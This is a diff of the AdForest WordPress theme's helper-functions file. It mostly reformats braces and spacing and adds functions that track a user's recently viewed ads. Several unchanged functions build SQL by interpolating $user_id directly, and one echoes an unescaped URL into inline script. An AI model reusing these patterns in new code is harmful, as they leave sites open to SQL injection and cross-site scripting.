+    function adforest_get_CallAbleNumber($phone_number = '')
+    {
         return preg_replace("/[^0-9+]/", "", $phone_number);
     }
 
@@ -1675,10 +1773,11 @@ if (!function_exists('adforest_get_CallAbleNumber')) {
 /* Show phone number to user check */
 if (!function_exists('adforest_showPhone_to_users')) {
 
-    function adforest_showPhone_to_users() {
+    function adforest_showPhone_to_users()
+    {
         global $adforest_theme;
 
-        $restrict_phone_show = ( isset($adforest_theme['restrict_phone_show']) ) ? $adforest_theme['restrict_phone_show'] : 'all';
+        $restrict_phone_show = (isset($adforest_theme['restrict_phone_show'])) ? $adforest_theme['restrict_phone_show'] : 'all';
         $is_show_phone = false;
         if ($restrict_phone_show == "login_only") {
             $is_show_phone = true;
@@ -1694,7 +1793,8 @@ if (!function_exists('adforest_showPhone_to_users')) {
 /* Time Ago */
 if (!function_exists('adforest_timeago')) {
 
-    function adforest_timeago($date) {
+    function adforest_timeago($date)
+    {
 
         adforest_set_date_timezone();
         $timestamp = strtotime($date);
@@ -1708,11 +1808,11 @@ if (!function_exists('adforest_timeago')) {
         $currentTime = strtotime($currentTime);
         if ($currentTime >= $timestamp) {
             $diff = $currentTime - $timestamp;
-            for ($i = 0; $diff >= $length[$i] && $i < count($length) - 1; $i++) {
-                $diff = $diff / $length[$i];
+            for ($i = 0; $diff >= $length[ $i ] && $i < count($length) - 1; $i++) {
+                $diff = $diff / $length[ $i ];
             }
             $diff = round($diff);
-            return $diff . " " . $strTime[$i] . __('(s) ago', 'adforest');
+            return $diff . " " . $strTime[ $i ] . __('(s) ago', 'adforest');
         }
     }
 
@@ -1721,11 +1821,12 @@ if (!function_exists('adforest_timeago')) {
 /* Return adforest ad statuses */
 if (!function_exists('adforest_ad_statues')) {
 
-    function adforest_ad_statues($index) {
+    function adforest_ad_statues($index)
+    {
         if ($index == "")
             $index = 'active';
         $sb_status = array('active' => __('Active', 'adforest'), 'expired' => __('Expired', 'adforest'), 'sold' => __('Sold', 'adforest'));
-        return $sb_status[$index];
+        return $sb_status[ $index ];
     }
 
 }
@@ -1733,11 +1834,12 @@ if (!function_exists('adforest_ad_statues')) {
 /* Return adforest ad statuses */
 if (!function_exists('adforest_is_demo')) {
 
-    function adforest_is_demo() {
+    function adforest_is_demo()
+    {
 
         global $adforest_theme;
 
-        $restrict_phone_show = ( isset($adforest_theme['is_demo']) ) ? $adforest_theme['is_demo'] : false;
+        $restrict_phone_show = (isset($adforest_theme['is_demo'])) ? $adforest_theme['is_demo'] : false;
 
         return $restrict_phone_show;
     }
@@ -1748,7 +1850,8 @@ if (!function_exists('adforest_is_demo')) {
 /* Bad word filter */
 if (!function_exists('adforest_badwords_filter')) {
 
-    function adforest_badwords_filter($words = array(), $string = "", $replacement = "") {
+    function adforest_badwords_filter($words = array(), $string = "", $replacement = "")
+    {
         foreach ($words as $word) {
             $string = preg_replace('/\b' . $word . '\b/iu', $replacement, $string);
         }
@@ -1761,7 +1864,8 @@ if (!function_exists('adforest_badwords_filter')) {
 /* get current page url */
 if (!function_exists('adforest_get_current_url')) {
 
-    function adforest_get_current_url() {
+    function adforest_get_current_url()
+    {
         $site_url = site_url();
         $findme = 'https';
         if (strpos($site_url, $findme) !== false) {
@@ -1776,7 +1880,8 @@ if (!function_exists('adforest_get_current_url')) {
 /* check is user login or not */
 if (!function_exists('adforest_user_logged_in')) {
 
-    function adforest_user_logged_in() {
+    function adforest_user_logged_in()
+    {
         if (get_current_user_id() != 0) {
             echo adforest_redirect(home_url('/'));
             exit;
@@ -1789,7 +1894,8 @@ if (!function_exists('adforest_user_logged_in')) {
 /* adforest redirect */
 if (!function_exists('adforest_redirect')) {
 
-    function adforest_redirect($url = '') {
+    function adforest_redirect($url = '')
+    {
         return "<script> var red_url = decodeURI('{$url}'); window.location = red_url;console.log(red_url);</script>";
     }
 
@@ -1798,7 +1904,8 @@ if (!function_exists('adforest_redirect')) {
 
 if (!function_exists('adforest_verify_sms_gateway')) {
 
-    function adforest_verify_sms_gateway() {
+    function adforest_verify_sms_gateway()
+    {
         global $adforest_theme;
         $gateway = '';
         if (isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification'] && class_exists('WP_Twilio_Core')) {
@@ -1816,13 +1923,14 @@ if (!function_exists('adforest_verify_sms_gateway')) {
 /* adforest search params */
 if (!function_exists('adforest_custom_remove_url_query')) {
 
-    function adforest_custom_remove_url_query($key = '', $value = '') {
+    function adforest_custom_remove_url_query($key = '', $value = '')
+    {
         $url = adforest_curPageURL();
         $param = "?" . $_SERVER['QUERY_STRING'];
         $url = preg_replace('/(?:&|(\?))' . $key . '=[^&]*(?(1)&|)?/i', "$1", $param);
         $url = rtrim($url, '?');
         $url = rtrim($url, '&');
-        $final_url = ( $url != "" ) ? $url . "&$key=$value" : "?$key=$value";
+        $final_url = ($url != "") ? $url . "&$key=$value" : "?$key=$value";
         return $final_url;
     }
 
@@ -1830,7 +1938,8 @@ if (!function_exists('adforest_custom_remove_url_query')) {
 
 if (!function_exists('adforest_curPageURL')) {
 
-    function adforest_curPageURL() {
+    function adforest_curPageURL()
+    {
         $pageURL = 'http';
         if (isset($_SERVER["HTTPS"]))
             if ($_SERVER["HTTPS"] == "on") {
@@ -1848,7 +1957,8 @@ if (!function_exists('adforest_curPageURL')) {
 }
 if (!function_exists('adforest_search_params')) {
 
-    function adforest_search_params($index, $second = '', $third = '', $search_url = false) {
+    function adforest_search_params($index, $second = '', $third = '', $search_url = false)
+    {
         global $adforest_theme;
         $param = $_SERVER['QUERY_STRING'];
         $res = '';
@@ -1871,9 +1981,9 @@ if (!function_exists('adforest_search_params')) {
                     }
                 }
 
-                if ($key == 'ad_cat_sub' || $key == 'ad_cat_sub_sub'  ||  $key == 'ad_cat_sub_sub_sub'  ||  $key == 'ad_cat_sub_sub_sub_sub'){
+                if ($key == 'ad_cat_sub' || $key == 'ad_cat_sub_sub' || $key == 'ad_cat_sub_sub_sub' || $key == 'ad_cat_sub_sub_sub_sub') {
                     continue;
-                      }
+                }
 
                 if (isset($vars['custom']) && count($vars['custom']) > 0 && 'custom' == $key) {
 
@@ -1941,7 +2051,8 @@ if (!function_exists('adforest_search_params')) {
 
 if (!function_exists('adforest_pagination_search')) {
 
-    function adforest_pagination_search($wp_query) {
+    function adforest_pagination_search($wp_query)
+    {
         //  if (is_singular())
         //return;
 
@@ -1969,7 +2080,7 @@ if (!function_exists('adforest_pagination_search')) {
             $links[] = $paged - 2;
         }
 
-        if (( $paged + 2 ) <= $max) {
+        if (($paged + 2) <= $max) {
             $links[] = $paged + 2;
             $links[] = $paged + 1;
         }
@@ -2012,7 +2123,8 @@ if (!function_exists('adforest_pagination_search')) {
 }
 if (!function_exists('get_next_posts_link_custom')) {
 
-    function get_next_posts_link_custom($wp_query, $label = null, $max_page = 0) {
+    function get_next_posts_link_custom($wp_query, $label = null, $max_page = 0)
+    {
         global $paged;
 
         if (!$max_page)
@@ -2046,7 +2158,8 @@ if (!function_exists('get_next_posts_link_custom')) {
 /* get ads category */
 if (!function_exists('adforest_get_cats')) {
 
-    function adforest_get_cats($taxonomy = 'category', $parent_of = 0, $child_of = 0, $type = 'general') {
+    function adforest_get_cats($taxonomy = 'category', $parent_of = 0, $child_of = 0, $type = 'general')
+    {
         global $adforest_theme;
         $search_popup_cat_disable = isset($adforest_theme['search_popup_cat_disable']) ? $adforest_theme['search_popup_cat_disable'] : false;
         $search_popup_loc_disable = isset($adforest_theme['search_popup_loc_disable']) ? $adforest_theme['search_popup_loc_disable'] : false;
@@ -2103,7 +2216,8 @@ if (!function_exists('adforest_get_cats')) {
 /* Get parents of custom taxonomy */
 if (!function_exists('adforest_get_taxonomy_parents')) {
 
-    function adforest_get_taxonomy_parents($id, $taxonomy, $link = true, $separator = ' &raquo; ', $nicename = false, $visited = array()) {
+    function adforest_get_taxonomy_parents($id, $taxonomy, $link = true, $separator = ' &raquo; ', $nicename = false, $visited = array())
+    {
 
         $chain = '';
         $parent = get_term($id, $taxonomy);
@@ -2140,7 +2254,8 @@ if (!function_exists('adforest_get_taxonomy_parents')) {
 
 if (!function_exists('adforest_search_layout')) {
 
-    function adforest_search_layout() {
+    function adforest_search_layout()
+    {
         global $adforest_theme, $template;
         $widget_layout = 'sidebar';
         if (isset($adforest_theme['search_design']) && $adforest_theme['search_design'] == 'topbar') {
@@ -2162,7 +2277,8 @@ if (!function_exists('adforest_search_layout')) {
 
 if (!function_exists('adforest_timer_html')) {
 
-    function adforest_timer_html($bid_end_date, $show_unit = true, $unit_style = 'style-1') {
+    function adforest_timer_html($bid_end_date, $show_unit = true, $unit_style = 'style-1')
+    {
         global $adforest_theme;
 
         if (isset($adforest_theme['bidding_timer']) && !$adforest_theme['bidding_timer']) {
@@ -2197,7 +2313,8 @@ if (!function_exists('adforest_timer_html')) {
 
 if (!function_exists('adforest_widget_counter')) {
 
-    function adforest_widget_counter($return = false) {
+    function adforest_widget_counter($return = false)
+    {
         global $adforest_theme;
         @$GLOBALS['widget_counter'] += 1;
         if ($GLOBALS['widget_counter'] == $adforest_theme['search_widget_limit']) {
@@ -2211,7 +2328,8 @@ if (!function_exists('adforest_widget_counter')) {
 }
 if (!function_exists('adforest_advance_search_container')) {
 
-    function adforest_advance_search_container($return = false) {
+    function adforest_advance_search_container($return = false)
+    {
         global $adforest_theme;
         if ($GLOBALS['widget_counter'] == $adforest_theme['search_widget_limit']) {
             if ($return)
@@ -2225,7 +2343,8 @@ if (!function_exists('adforest_advance_search_container')) {
 // get the depth level of any taxonomy
 if (!function_exists('adforest_get_taxonomy_depth')) {
 
-    function adforest_get_taxonomy_depth($term_id = 0, $taxonomy = 'ad_cats') {
+    function adforest_get_taxonomy_depth($term_id = 0, $taxonomy = 'ad_cats')
+    {
 
         if ($term_id != 0) {
             $ancestors = get_ancestors($term_id, $taxonomy);
@@ -2241,7 +2360,8 @@ add_action('wp_ajax_get_related_cities', 'adforest_get_countries');
 add_action('wp_ajax_nopriv_get_related_cities', 'adforest_get_countries');
 if (!function_exists('adforest_get_countries')) {
 
-    function adforest_get_countries() {
+    function adforest_get_countries()
+    {
         global $adforest_theme;
 
         $cat_id = $_POST['country_id'];
@@ -2273,7 +2393,8 @@ if (!function_exists('adforest_get_countries')) {
 }
 if (!function_exists('adforest_determine_minMax_latLong')) {
 
-    function adforest_determine_minMax_latLong($data_arr = array(), $check_db = true) {
+    function adforest_determine_minMax_latLong($data_arr = array(), $check_db = true)
+    {
 
         global $adforest_theme;
 
@@ -2325,7 +2446,8 @@ if (!function_exists('adforest_determine_minMax_latLong')) {
     }
 }
 if (!function_exists('adforest_getLatLong')) {
-    function adforest_getLatLong($address = '') {
+    function adforest_getLatLong($address = '')
+    {
         global $adforest_theme;
 
         $gmap_api_key = isset($adforest_theme['gmap_api_key']) && !empty($adforest_theme['gmap_api_key']) ? $adforest_theme['gmap_api_key'] : '';
@@ -2367,14 +2489,18 @@ if (!function_exists('adforest_getLatLong')) {
 }
 if (!function_exists('adforest_get_feature_text')) {
 
-    function adforest_get_feature_text($pid) {
+    function adforest_get_feature_text($pid)
+    {
         ?>
         <div role="alert" class="alert alert-info alert-dismissible">
             <i class="fa fa-info-circle"></i>
             <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
 
             <?php echo __('Mark as featured Ad,', 'adforest'); ?>
-            <a href="javascript:void(0);" class="sb_anchor" data-btn-ok-label="<?php echo __('Yes', 'adforest'); ?>" data-btn-cancel-label="<?php echo __('No', 'adforest'); ?>" data-bs-toggle="confirmation" data-singleton="true" data-title="<?php echo __('Are you sure?', 'adforest'); ?>" data-content="" id="sb_feature_ad" aaa_id="<?php echo esc_attr($pid); ?>">
+            <a href="javascript:void(0);" class="sb_anchor" data-btn-ok-label="<?php echo __('Yes', 'adforest'); ?>"
+                data-btn-cancel-label="<?php echo __('No', 'adforest'); ?>" data-bs-toggle="confirmation" data-singleton="true"
+                data-title="<?php echo __('Are you sure?', 'adforest'); ?>" data-content="" id="sb_feature_ad"
+                aaa_id="<?php echo esc_attr($pid); ?>">
                 <?php echo __('Click Here.', 'adforest'); ?>
             </a>
 
@@ -2388,23 +2514,82 @@ if (!function_exists('adforest_get_feature_text')) {
 }
 if (!function_exists('adforest_get_feature_text_new_pkg')) {
 
-    function adforest_get_feature_text_new_pkg($pid) {
+    function adforest_get_feature_text_new_pkg($pid)
+    {
         ?>
         <div role="alert" class="alert alert-info alert-dismissible">
             <i class="fa fa-info-circle"></i>
             <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
 
             <?php echo __('Mark as featured Ad,', 'adforest'); ?>
-            <a class="mb-1  mr-2 sb_anchor sb_make_feature_ad_detial_page" href="javascript:void(0);"  data-aaa-id="<?php echo esc_attr($pid); ?>"><?php echo __('Click Here.', 'adforest'); ?></a>
+            <a class="mb-1  mr-2 sb_anchor sb_make_feature_ad_detial_page" href="javascript:void(0);"
+                data-aaa-id="<?php echo esc_attr($pid); ?>"><?php echo __('Click Here.', 'adforest'); ?></a>
         </div>
         <?php
     }
 
 }
 
+if (!function_exists('adforest_recently_viewed_ad')) {
+    function adforest_recently_viewed_ad($pid)
+    { ?>
+
+        <div role="alert" class="alert alert-info alert-dismissible">
+            <i class="fa fa-info-circle"></i>
+            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+
+            <?php echo __('Ad Recently Viewed', 'adforest'); ?>
+        </div>
+
+    <?php }
+}
+
+if (!function_exists('add_recently_viewed_ad_post')) {
+    function add_recently_viewed_ad_post($post_id) {
+        if (is_user_logged_in() && get_post_type($post_id) === 'ad_post') {
+            $user_id = get_current_user_id();
+            $recently_viewed = get_user_meta($user_id, 'recently_viewed_ad_posts', true);
+
+            if (!$recently_viewed) {
+                $recently_viewed = [];
+            }
+
+            // Remove the post if it already exists in the array
+            if (($key = array_search($post_id, $recently_viewed)) !== false) {
+                unset($recently_viewed[ $key ]);
+            }
+
+            // Add the post to the beginning of the array
+            array_unshift($recently_viewed, $post_id);
+
+            // Limit the array to 10 posts
+            $recently_viewed = array_slice($recently_viewed, 0, 10);
+
+            // Update the user meta
+            update_user_meta($user_id, 'recently_viewed_ad_posts', $recently_viewed);
+        }
+    }
+}
+
+if (!function_exists('is_recently_viewed_ad_post')) {
+    function is_recently_viewed_ad_post($post_id)
+    {
+        if (is_user_logged_in()) {
+            $user_id = get_current_user_id();
+            $recently_viewed = get_user_meta($user_id, 'recently_viewed_ad_posts', true);
+
+            if ($recently_viewed && is_array($recently_viewed)) {
+                return in_array($post_id, $recently_viewed);
+            }
+        }
+        return false;
+    }
+}
+
 if (!function_exists('adforest_social_profiles')) {
 
-    function adforest_social_profiles() {
+    function adforest_social_profiles()
+    {
         global $adforest_theme;
         if (isset($adforest_theme['sb_enable_social_links']) && $adforest_theme['sb_enable_social_links']) {
             $social_netwroks = array(
@@ -2412,7 +2597,7 @@ if (!function_exists('adforest_social_profiles')) {
                 'twitter' => __('Twitter', 'adforest'),
                 'linkedin' => __('Linkedin', 'adforest'),
                 'instagram' => __('Instagram', 'adforest'),
-                    //'google' => __('Google', 'adforest')
+                //'google' => __('Google', 'adforest')
             );
         } else {
             $social_netwroks = array();
@@ -2425,7 +2610,8 @@ if (!function_exists('adforest_social_profiles')) {
 
 if (!function_exists('adforest_get_sold_ads')) {
 
-    function adforest_get_sold_ads($user_id) {
+    function adforest_get_sold_ads($user_id)
+    {
         global $wpdb;
         $total = $wpdb->get_var("SELECT COUNT(*) AS total FROM $wpdb->posts WHERE post_type = 'ad_post' AND post_author = '$user_id' AND post_status = 'publich' ");
 
@@ -2448,7 +2634,8 @@ if (!function_exists('adforest_get_sold_ads')) {
 
 if (!function_exists('adforest_get_all_ads')) {
 
-    function adforest_get_all_ads($user_id) {
+    function adforest_get_all_ads($user_id)
+    {
         global $wpdb;
         $total = $wpdb->get_var("SELECT COUNT(*) AS total FROM  $wpdb->posts WHERE post_type = 'ad_post' AND post_status = 'publish' AND post_author = '$user_id'");
         $total = apply_filters('adforest_get_lang_posts_by_author', $total, $user_id);
@@ -2461,7 +2648,8 @@ if (!function_exists('adforest_get_all_ads')) {
 /* search only within posts. */
 if (!function_exists('adforest_search_filter')) {
 
-    function adforest_search_filter($query) {
+    function adforest_search_filter($query)
+    {
         if ($query->is_author) {
             $query->set('post_type', array('ad_post'));
             $query->set('post_status', array('publish'));
@@ -2478,7 +2666,8 @@ if (!is_admin() && isset($_GET['type']) && $_GET['type'] == 'ads') {
 add_filter('adforest_grid_two_column', 'adforest_grid_two_column_callback', 10, 2);
 if (!function_exists('adforest_grid_two_column_callback')) {
 
-    function adforest_grid_two_column_callback($col_class = 'col-12', $class = '', $for_slider = false) {
+    function adforest_grid_two_column_callback($col_class = 'col-12', $class = '', $for_slider = false)
+    {
         global $adforest_theme;
         $sb_2column = (isset($adforest_theme['sb_2column_mobile_layout']) && $adforest_theme['sb_2column_mobile_layout'] == true) ? true : false;
         if ($sb_2column == true) {
@@ -2501,7 +2690,8 @@ if (!function_exists('adforest_grid_two_column_callback')) {
 add_filter('adforest_category_widget_form_action', 'adforest_category_widget_form_action', 10, 2);
 if (!function_exists('adforest_category_widget_form_action')) {
 
-    function adforest_category_widget_form_action($sb_search_page, $widget_action = '') {
+    function adforest_category_widget_form_action($sb_search_page, $widget_action = '')
+    {
         global $template, $wp;
         $page_template = basename($template);
         if ($page_template == 'taxonomy-ad_cats.php') {
@@ -2522,7 +2712,8 @@ if (!function_exists('adforest_category_widget_form_action')) {
 }
 if (!function_exists('adforest_returnImgSrc')) {
 
-    function adforest_returnImgSrc($id, $size = 'full', $showHtml = false, $class = '', $alt = '') {
+    function adforest_returnImgSrc($id, $size = 'full', $showHtml = false, $class = '', $alt = '')
+    {
 
         $img = '';
         if (isset($id) && $id != "") {
@@ -2530,8 +2721,8 @@ if (!function_exists('adforest_returnImgSrc')) {
                 $img1 = wp_get_attachment_image_src($id, $size);
                 $img = (isset($img1[0])) ? $img1[0] : '';
             } else {
-                $class = ( $class != "" ) ? 'class="' . esc_attr($class) . '"' : '';
-                $alt = ( $alt != "" ) ? 'alt="' . esc_attr($alt) . '"' : '';
+                $class = ($class != "") ? 'class="' . esc_attr($class) . '"' : '';
+                $alt = ($alt != "") ? 'alt="' . esc_attr($alt) . '"' : '';
                 $img1 = wp_get_attachment_image_src($id, $size);
                 $img = '<img src="' . esc_url($img1[0]) . '" ' . $class . ' ' . $alt . '>';
             }
@@ -2544,13 +2735,14 @@ add_action('adforest_validate_phone_verification', 'adforest_validate_phone_veri
 
 if (!function_exists('adforest_validate_phone_verification')) {
 
-    function adforest_validate_phone_verification() {
+    function adforest_validate_phone_verification()
+    {
         global $adforest_theme;
         $page_url = home_url('/');
         $sb_profile_page = isset($adforest_theme['sb_profile_page']) && $adforest_theme['sb_profile_page'] != '' ? $adforest_theme['sb_profile_page'] : get_option('page_on_front');
 
         $sb_profile_page = apply_filters('adforest_language_page_id', $sb_profile_page);
-        
+
         if (is_user_logged_in()) {
             $enable_phone_verification = isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification'] ? True : FALSE;
             $ad_post_with_phone_verification = isset($adforest_theme['ad_post_restriction']) && $adforest_theme['ad_post_restriction'] == 'phn_verify' ? True : FALSE;
@@ -2569,7 +2761,8 @@ if (!function_exists('adforest_validate_phone_verification')) {
 /* Redirect */
 if (!function_exists('adforest_redirect_with_msg')) {
 
-    function adforest_redirect_with_msg($url, $msg = '', $message_type = 'error') {
+    function adforest_redirect_with_msg($url, $msg = '', $message_type = 'error')
+    {
         if ($message_type == 'success') {
             echo '<script type="text/javascript" src="' . trailingslashit(get_template_directory_uri()) . 'assests/js/toastr.min.js"></script><script type="text/javascript"> toastr.success("' . $msg . '", "", {timeOut: 2500,"closeButton": true, "positionClass": "toast-top-right"}); window.location =   "' . $url . '";</script>';
         } else {
@@ -2582,7 +2775,8 @@ if (!function_exists('adforest_redirect_with_msg')) {
 // Get lat lon by location
 if (!function_exists('adforest_get_latlon')) {
 
-    function adforest_get_latlon($location) {
+    function adforest_get_latlon($location)
+    {
         global $wpdb;
         $table_name = $wpdb->prefix . 'adforest_locations';
         // Explode location
@@ -2623,13 +2817,14 @@ if (!function_exists('adforest_get_latlon')) {
 add_action('wp_ajax_get_uploaded_ad_images', 'adforest_get_uploaded_ad_images');
 if (!function_exists('adforest_get_uploaded_ad_images')) {
 
-    function adforest_get_uploaded_ad_images() {
+    function adforest_get_uploaded_ad_images()
+    {
         if ($_POST['is_update'] != "") {
             $ad_id = $_POST['is_update'];
         } else {
             $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
             if (get_post_status($ad_id) && $ad_id != "" && get_post_status($ad_id) != 'publish') {
-                
+
             } else {
                 return '';
                 die();
@@ -2670,7 +2865,8 @@ if (!function_exists('adforest_get_uploaded_ad_images')) {
 add_action('wp_ajax_delete_ad_image', 'adforest_delete_ad_image');
 if (!function_exists('adforest_delete_ad_image')) {
 
-    function adforest_delete_ad_image() {
+    function adforest_delete_ad_image()
+    {
         if (get_current_user_id() == "")
             die();
         if ($_POST['is_update'] != "") {
@@ -2697,7 +2893,8 @@ if (!function_exists('adforest_delete_ad_image')) {
 }
 if (!function_exists('adforest_get_static_form')) {
 
-    function adforest_get_static_form($term_id = '', $post_id = '') {
+    function adforest_get_static_form($term_id = '', $post_id = '')
+    {
         $html = '';
         $display_size = '';
         $price = '';
@@ -2750,12 +2947,12 @@ if (!function_exists('adforest_get_static_form')) {
 
         $sb_price_types_html = '';
         foreach ($sb_price_types as $p_val) {
-            $new_types_array[$p_val] = $sb_price_types_strings[$p_val];
+            $new_types_array[ $p_val ] = $sb_price_types_strings[ $p_val ];
         }
         if (isset($adforest_theme['sb_price_types_more']) && $adforest_theme['sb_price_types_more'] != "") {
             $sb_price_types_more_array = explode('|', $adforest_theme['sb_price_types_more']);
             foreach ($sb_price_types_more_array as $p_type_more) {
-                $new_types_array[str_replace(' ', '_', $p_type_more)] = $p_type_more;
+                $new_types_array[ str_replace(' ', '_', $p_type_more) ] = $p_type_more;
             }
         }
 
@@ -2822,7 +3019,7 @@ if (!function_exists('adforest_get_static_form')) {
         }
 
         if (isset($_sb_video_links) && !empty($_sb_video_links) && $_sb_video_links == 'no') {
-            
+
         } else {
 
             if ($required) {
@@ -2922,10 +3119,11 @@ if (!function_exists('adforest_get_static_form')) {
                 'field_class' => ' dropzone ',
                 'columns' => '12',
                 'data-parsley-type' => '',
-                'data-parsley-message' => __('This field is required.', 'adforest'),);
+                'data-parsley-message' => __('This field is required.', 'adforest'),
+            );
         }
         if (isset($_sb_allow_tags) && !empty($_sb_allow_tags) && $_sb_allow_tags == 'no') {
-            
+
         } else {
             $vals[] = array(
                 'type' => 'textfield',
@@ -2958,7 +3156,8 @@ add_filter('adforest_make_bid_categ', 'adforest_make_bid_categ_callback', 11, 1)
 
 if (!function_exists('adforest_make_bid_categ_callback')) {
 
-    function adforest_make_bid_categ_callback($bid_categories = true) {
+    function adforest_make_bid_categ_callback($bid_categories = true)
+    {
         global $adforest_theme;
         $_sb_allow_bidding = get_user_meta(get_current_user_id(), '_sb_allow_bidding', true);
         $sb_enable_comments_offer = isset($adforest_theme['sb_enable_comments_offer']) ? $adforest_theme['sb_enable_comments_offer'] : false;
@@ -3000,7 +3199,8 @@ if (!function_exists('adforest_make_bid_categ_callback')) {
 
 }
 if (!function_exists('adforest_get_disbale_ads')) {
-    function adforest_get_disbale_ads($user_id) {
+    function adforest_get_disbale_ads($user_id)
+    {
         global $wpdb;
         $rows = $wpdb->get_results("SELECT ID FROM $wpdb->posts WHERE post_author = '$user_id' AND post_status = 'pending' AND post_type = 'ad_post' ");
         return count($rows);
@@ -3008,7 +3208,8 @@ if (!function_exists('adforest_get_disbale_ads')) {
 
 }
 if (!function_exists('adforest_check_if_phoneVerified')) {
-    function adforest_check_if_phoneVerified($user_id = 0) {
+    function adforest_check_if_phoneVerified($user_id = 0)
+    {
         global $adforest_theme;
         $verifed_phone_number = false;
         if (isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification']) {
@@ -3026,23 +3227,27 @@ if (!function_exists('adforest_check_if_phoneVerified')) {
 }
 /* get feature image */
 if (!function_exists('adforest_get_feature_image')) {
-    function adforest_get_feature_image($post_id, $image_size) {
+    function adforest_get_feature_image($post_id, $image_size)
+    {
         return wp_get_attachment_image_src(get_post_thumbnail_id(esc_html($post_id)), $image_size);
     }
 }
 if (!function_exists('adforest_get_date')) {
-    function adforest_get_date($PID) {
+    function adforest_get_date($PID)
+    {
         echo get_the_date(get_option('date_format'), $PID);
     }
 
 }
 if (!function_exists('adforest_get_comments')) {
-    function adforest_get_comments() {
+    function adforest_get_comments()
+    {
         echo get_comments_number() . " " . __('comments', 'adforest');
     }
 }
 if (!function_exists('adforest_comments_list')) {
-    function adforest_comments_list($comment, $args, $depth) {
+    function adforest_comments_list($comment, $args, $depth)
+    {
         $GLOBALS['comment'] = $comment;
         $img = '';
         if (get_avatar_url($comment, 44) != "") {
@@ -3057,7 +3262,8 @@ if (!function_exists('adforest_comments_list')) {
                 <div class="author-title">
                     <strong><?php comment_author(); ?></strong>
                     <ul class="list-inline pull-right">
-                        <li><a href="javascript:void(0);"><?php echo esc_html(get_comment_date()) . " " . esc_html(get_comment_time()); ?></a>
+                        <li><a
+                                href="javascript:void(0);"><?php echo esc_html(get_comment_date()) . " " . esc_html(get_comment_time()); ?></a>
                         </li>
                         <?php
                         $myclass = ' active-color';
@@ -3077,258 +3283,269 @@ if (!function_exists('adforest_comments_list')) {
             //}
             ?>
             <?php
-        }
-
     }
-    /* Breadcrumb */
-    if (!function_exists('adforest_breadcrumb')) {
 
-        function adforest_breadcrumb() {
-            $string = '';
-            global $adforest_theme;
-            if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_shop()) {
-                $string .= isset($adforest_theme['shop-number-page-title']) ? $adforest_theme['shop-number-page-title'] : __('Shop', 'adforest');
-            } else if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_product()) {
-                $string .= isset($adforest_theme['shop-single-page-title']) ? $adforest_theme['shop-single-page-title'] : __('Details', 'adforest');
-            } else if (is_category()) {
-                $string .= esc_html(get_cat_name(adforest_getCatID()));
-            } else if (is_single()) {
-                $string .= esc_html(get_the_title());
-            } elseif (is_page()) {
-                $string .= esc_html(get_the_title());
-            } elseif (is_tag()) {
-                $string .= esc_html(single_tag_title("", false));
-            } elseif (is_search()) {
-                $string .= esc_html(get_search_query());
-            } elseif (is_404()) {
-                $string .= esc_html__('Page not Found', 'adforest');
-            } elseif (is_author()) {
-                $string .= __('Author', 'adforest');
-            } else if (is_tax()) {
-                $string .= esc_html(single_cat_title("", false));
-            } elseif (is_archive()) {
-                $string .= esc_html__('Archive', 'adforest');
-            } else if (is_home()) {
-                $string = esc_html__('Latest Stories', 'adforest');
+}
+/* Breadcrumb */
+if (!function_exists('adforest_breadcrumb')) {
+
+    function adforest_breadcrumb()
+    {
+        $string = '';
+        global $adforest_theme;
+        if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_shop()) {
+            $string .= isset($adforest_theme['shop-number-page-title']) ? $adforest_theme['shop-number-page-title'] : __('Shop', 'adforest');
+        } else if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_product()) {
+            $string .= isset($adforest_theme['shop-single-page-title']) ? $adforest_theme['shop-single-page-title'] : __('Details', 'adforest');
+        } else if (is_category()) {
+            $string .= esc_html(get_cat_name(adforest_getCatID()));
+        } else if (is_single()) {
+            $string .= esc_html(get_the_title());
+        } elseif (is_page()) {
+            $string .= esc_html(get_the_title());
+        } elseif (is_tag()) {
+            $string .= esc_html(single_tag_title("", false));
+        } elseif (is_search()) {
+            $string .= esc_html(get_search_query());
+        } elseif (is_404()) {
+            $string .= esc_html__('Page not Found', 'adforest');
+        } elseif (is_author()) {
+            $string .= __('Author', 'adforest');
+        } else if (is_tax()) {
+            $string .= esc_html(single_cat_title("", false));
+        } elseif (is_archive()) {
+            $string .= esc_html__('Archive', 'adforest');
+        } else if (is_home()) {
+            $string = esc_html__('Latest Stories', 'adforest');
+        }
+        return $string;
+    }
+
+}
+/* Get BreadCrumb Heading */
+if (!function_exists('adforest_bread_crumb_heading')) {
+
+    function adforest_bread_crumb_heading()
+    {
+        $page_heading = '';
+        global $adforest_theme;
+        if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_shop()) {
+            $page_heading = isset($adforest_theme['shop-number-page-title']) ? $adforest_theme['shop-number-page-title'] : __('Shop', 'adforest');
+        } else if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_product()) {
+            $page_heading = isset($adforest_theme['shop-single-page-title']) ? $adforest_theme['shop-single-page-title'] : __('Details', 'adforest');
+        } else if (is_search()) {
+            $string = esc_html__('entire web', 'adforest');
+            if (get_search_query() != "") {
+                $string = get_search_query();
             }
-            return $string;
-        }
-
-    }
-    /* Get BreadCrumb Heading */
-    if (!function_exists('adforest_bread_crumb_heading')) {
-
-        function adforest_bread_crumb_heading() {
-            $page_heading = '';
-            global $adforest_theme;
-            if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_shop()) {
-                $page_heading = isset($adforest_theme['shop-number-page-title']) ? $adforest_theme['shop-number-page-title'] : __('Shop', 'adforest');
-            } else if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) && is_product()) {
-                $page_heading = isset($adforest_theme['shop-single-page-title']) ? $adforest_theme['shop-single-page-title'] : __('Details', 'adforest');
